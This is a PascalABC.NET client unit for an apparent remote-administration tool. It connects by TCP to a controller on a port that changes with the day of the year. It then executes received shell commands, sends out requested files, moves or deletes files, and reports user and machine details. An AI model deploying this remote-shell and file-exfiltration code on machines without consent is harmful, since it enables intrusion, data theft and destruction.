unit client;

uses 
  System.Net.Sockets, 
  System.Management,
  System.Threading, 
  System.Text, 
  System.Net, 
  System.IO,
  System, 
  Newtonsoft.Json,
  types, cmd;

type
  TClient = class 
    
    public AppIsRunning: boolean;
    
    public next, prev: TClient; 
    public ip: string;
    public client: TcpClient;
    public stream: NetworkStream;
    public retry: byte;
    public port: word;
    public path, epath: string;
    public WinInfo: WindowsInformation;
    public _message_handler_service: Thread;
    public tickInterval: word;
    public lastTick: DateTime;
    
    public constructor(ip: string);
    begin
      self.ip := ip; 
      self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
      self._message_handler_service := new Thread(MessageHandler);
      self.WinInfo := self.GetOSInfo();
      self.tickInterval := 7000;
      self.lastTick := DateTime.Now;
    end;
    
    
    public constructor(ip: string; port: word; clnt: TcpClient);
    begin
      self.client := clnt;
      self.client.Client.ReceiveTimeout := 100;
      self.ip := ip;
      self.port := port;
      self._message_handler_service := new Thread(MessageHandler);
    end;
    
    
    public function ConnectedMsg(): string;
    begin
      if self.client = nil then
        Result := 'Сервер не отвечает!' else 
        Result := 'Подключение установлено!';
    end;
    
    
    public procedure Connect();
    begin
      Thread.Create(
        () -> begin
        while self.retry < MAX_RETRIES do
        begin
          try
            self.client := new TcpClient(self.ip, self.port);
            self.client.Client.ReceiveTimeout := 100;
            self.client.SendTimeout := 4000;
            self.client.ReceiveTimeout := 4000;
            self.AppIsRunning := true;
            self._message_handler_service.Start();
            cmd.CD();
            self.path := cmd.output;
            break; // Если подключились, выходим из цикла
          except
            Thread.Sleep(RETRY_DELAY); // Задержка перед повторной попыткой
          end;
          Inc(self.retry);
        end;
      end).Start();
      
    end;
    
    
    public procedure Disconnect();
    begin
      self.AppIsRunning := false;
      if (self.client <> nil) and (self.client.Connected) then begin
        self.client.Close();
        self.client.Dispose();
        self.client := nil;
        self.KillAllServices();
      end;
    end;
    
    
    public procedure KillAllServices();
    begin
      // Устанавливаем флаг остановки
      AppIsRunning := false;
      
      // Ждем завершения всех потоков
      foreach var service in [self._message_handler_service] do
      begin
        if (service <> nil) and service.IsAlive then begin
          service.Join(1000); // Даем 1 секунду на завершение
          if service.IsAlive then
            service.Abort(); // Принудительное завершение, если не ответил
        end;
      end;
      
    end;
    
    
    private procedure MessageHandler();
    begin
      self.stream := self.client.GetStream();
      
      var data: array of byte;
      
      while self.AppIsRunning do begin
        
        if self.stream.DataAvailable then begin
          SetLength(data, self.client.ReceiveBufferSize);
          var len := self.stream.Read(data, 0, data.Length);
          
          if len = 0 then 
            self.AppIsRunning := false; 
          var message := Encoding.UTF8.GetString(data, 0, len);
          
          if message = 'PING' then 
             message := 'PONG' else 
               
          if message = GETPATH then
             message := self.path else 
               
          if message = GET_WIN_INFO then
             message := JsonConvert.SerializeObject(GetOSInfo()) else
               
          if message.StartsWith('E@') then 
             message := ExplorerHandler(message) 
          else               
             message := ConsoleHandler(message);
          
          data := Encoding.UTF8.GetBytes(message);
          self.stream.Write(data, 0, data.Length);
          
          self.lastTick := DateTime.Now;
        end
        else begin
          var now := DateTime.Now;
          var elapsed := (now - self.lastTick).TotalMilliseconds;
      
          if elapsed >= tickInterval then
            self.Disconnect();
        end;
      end; // while
      
      stream.Close();
      
    end;
    
    /// Обработка полученных запросов от консоли
    public function ConsoleHandler(msg: string): string;
    begin
      var responce: string;
      
      cmd.run(msg);
      responce := cmd.output;
      
      if responce.StartsWith('cd>') then begin
        responce := responce.Substring(3);
        self.path := responce;
      end;
      
      Result := responce;
    end;  
    
    /// Обработка полученных запросов от проводника
    public function ExplorerHandler(msg: string): string;
    begin
      var responce: string = msg;
      
      case msg[:5] of
        E_GET_PATH: 
          responce := self.epath;
        E_GET_DIRS: 
          responce := JsonConvert.SerializeObject(Directory.GetDirectories(self.epath));
        E_GET_FILES:
          responce := JsonConvert.SerializeObject(Directory.GetFiles(self.epath));
        E_ARROW_UP:
        begin
          Print('E_ARROW_UP:',self.epath);
          self.epath := self.epath.Substring(0, self.epath.LastIndexOf(SLASH));
          Print('->',self.epath);
          if self.epath.Length <= 3 then self.epath += SLASH;
          Println('->',self.epath);
          responce := self.epath;
        end;
        E_ENTER_FOLDER:
        begin
          if Directory.EnumerateDirectories(self.epath, msg.Substring(4), SearchOption.TopDirectoryOnly).Count() > 0 then begin
            try 
              var tempPath: string; Print('E_ENTER_FOLDER:',self.epath);
              if self.epath.LastIndexOf(SLASH)+1 = self.epath.Length then
                tempPath := self.epath + msg.Substring(4) else
                tempPath := self.epath + SLASH + msg.Substring(4);
              Directory.GetDirectories(tempPath);
              self.epath := tempPath; Println('->',self.epath);
            except on e: Exception do 
              responce := E_ERROR_OPEN_FOLDER + #13 + e.Message;
            end; // try
          end;
        end; 
        E_ENTER_SHORTCUT:
        begin
          self.epath := msg.Substring(4);
          Println('E_ENTER_SHORTCUT:',self.epath);
        end; 
        E_RECEIVE_FILE: {$region Передача файла}
        begin
          var filePath := msg.Substring(4);
          var FStream: FileStream;
          
          try
            FStream := &File.OpenRead(filePath);
          except on e: Exception do 
            begin
              Println(e.Message);
              exit(E_ERROR_OPEN_FILE + ': ' + e.Message);
            end;
          end;
          
          // Получение размера файла
          var fileSize := FStream.Length;
          var sizeBuffer := System.BitConverter.GetBytes(fileSize); // 8 байт Int64
          
          // Отправка 8 байт с размером файла
          stream.Write(sizeBuffer, 0, sizeBuffer.Length);
          
          // Отправка файла по частям
          var buffer := new byte[4096];
          var bytesRead := 0;
          
          repeat
            bytesRead := FStream.Read(buffer, 0, buffer.Length);
            if bytesRead > 0 then
              stream.Write(buffer, 0, bytesRead);
          until bytesRead = 0;
          
          FStream.Close();
          
          responce := E_FILE_SUCCESSFULLY_TRANSFERRED;                         
        end;{$endregion}    
        E_PASTE_ITEM: {$region Вставка скопированных\вырезанных данных}
        begin
          var info: PasteInformation = JsonConvert.DeserializeObject&<PasteInformation>(msg.Substring(4));
          Println(msg.Substring(4));
          if info.Code = E_CUT_ITEM then begin
            foreach var item in JsonConvert.DeserializeObject&<array of string>(info.Items) do begin
              if Directory.Exists(info.TakeFrom(item)) then 
                cmd.MOVE(info.TakeFrom(item), info.PasteHere(item))
              else if System.IO.File.Exists(info.TakeFrom(item)) then
                System.IO.File.Move(info.TakeFrom(item), info.PasteHere(item)) 
              else begin
                  Println('Скип', item, info.TakeFrom(item),'->', info.PasteHere(item));
                  Println(info.SourcePath, info.DestinationPath)
               end;
            end;
            responce := 'Перемещение прошло успешно';
          end else begin
            foreach var item in JsonConvert.DeserializeObject&<array of string>(info.Items) do begin
              if Directory.Exists(info.TakeFrom(item)) then
                self.CopyDirectory(info.TakeFrom(item), info.PasteHere(item))
              else
                System.IO.File.Copy(info.TakeFrom(item), info.PasteHere(item), true);
            end;
            responce := 'Копирование прошло успешно';
          end;
        end;{$endregion}
        E_DELETE_ITEM:
        begin
          var items_path: string = msg.Substring(4, msg.IndexOf('[')-4) + SLASH;
          var JsonObjectStr := msg.Substring(msg.IndexOf('['));
          var items := JsonConvert.DeserializeObject&<array of string>(JsonObjectStr);
          foreach var item in items do
            if Directory.Exists(items_path+item) then
              cmd.RMDIR(items_path+item) else
              System.IO.File.Delete(items_path+item);
          responce := 'Удаление прошло успешно';
        end;
        E_GET_ALL_FILES_IN_FOLDER:
          responce := JsonConvert.SerializeObject(Directory.GetFiles(msg.Substring(4), '*', SearchOption.AllDirectories));
      
      end; // case

      Result := responce;
    end;    
  
  
    public procedure CopyDirectory(sourceDir, destDir: string);
    begin
      // Создаём целевую директорию, если она не существует
      if not Directory.Exists(destDir) then
        Directory.CreateDirectory(destDir);
    
      // Копируем все файлы из sourceDir
      foreach var fileName in Directory.GetFiles(sourceDir) do
      begin
        var destFile := System.IO.Path.Combine(destDir, System.IO.Path.GetFileName(fileName));
        System.IO.File.Copy(fileName, destFile, true);
      end;
    
      // Рекурсивно копируем поддиректории
      foreach var dirName in Directory.GetDirectories(sourceDir) do
      begin
        var destSubDir := System.IO.Path.Combine(destDir, System.IO.Path.GetFileName(dirName));
        CopyDirectory(dirName, destSubDir);
      end;
    end;
    
     
    private function GetOSInfo(): WindowsInformation;
    begin 
      var searcher := new ManagementObjectSearcher('SELECT Caption FROM Win32_OperatingSystem');
      var WinVer: string;
      
      foreach var obj: ManagementObject in searcher.Get() do
        WinVer := obj['Caption'].ToString;
                   
      Result := new WindowsInformation(
        GetEnvInfo(),
        WinVer.Substring(11),
        Environment.OSVersion.Platform,
        Environment.UserName,
        Environment.MachineName
      );
    end;
    
    
    private function GetEnvInfo(): ExplorerInformation;
    begin
      Result := new ExplorerInformation(
        DriveInfo.GetDrives(),
        Environment.GetFolderPath(Environment.SpecialFolder.Desktop), 
        Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
        Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
        Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
      );
    end;
  
  end; // class

end.
